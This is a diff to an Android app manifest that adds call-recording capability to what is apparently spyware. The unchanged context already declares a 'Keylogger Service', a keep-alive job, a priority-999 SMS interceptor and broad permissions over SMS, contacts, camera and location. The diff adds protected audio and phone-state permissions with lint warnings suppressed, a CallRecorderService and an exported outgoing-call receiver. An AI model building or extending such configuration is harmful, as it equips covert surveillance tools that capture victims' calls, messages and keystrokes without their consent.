@@ -21,6 +21,7 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_PHONE_CALL" />
 
     <!-- ★★ WakeLock ★★ -->
     <uses-permission android:name="android.permission.WAKE_LOCK" />
@@ -42,7 +43,7 @@
     <uses-permission android:name="android.permission.WRITE_SYNC_SETTINGS" />
     <uses-permission android:name="android.permission.READ_SYNC_STATS" />
 
-    <!-- ★★★ SMS & Calls (MOST IMPORTANT) ★★★ -->
+    <!-- ★★★ SMS & Calls ★★★ -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -55,6 +56,14 @@
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
 
+    <!-- ★★★ Call Recording ★★★ -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
+        tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"
+        tools:ignore="ProtectedPermissions" />
+
     <!-- ★★ Contacts ★★ -->
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
@@ -66,8 +75,6 @@
 
     <!-- ★★ Camera & Audio ★★ -->
     <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
 
     <!-- ★★ Vibration ★★ -->
     <uses-permission android:name="android.permission.VIBRATE" />
@@ -141,6 +148,12 @@
             android:name=".KeepAliveJobService"
             android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
+
+        <!-- ★★★ Call Recorder Service ★★★ -->
+        <service
+            android:name=".CallRecorderService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync|microphone" />
 
         <!-- ★★★ Keylogger Service ★★★ -->
         <service
@@ -281,6 +294,16 @@
             android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ★★★ Outgoing Call Receiver ★★★ -->
+        <receiver
+            android:name=".CallRecorderService$CallStateReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
 
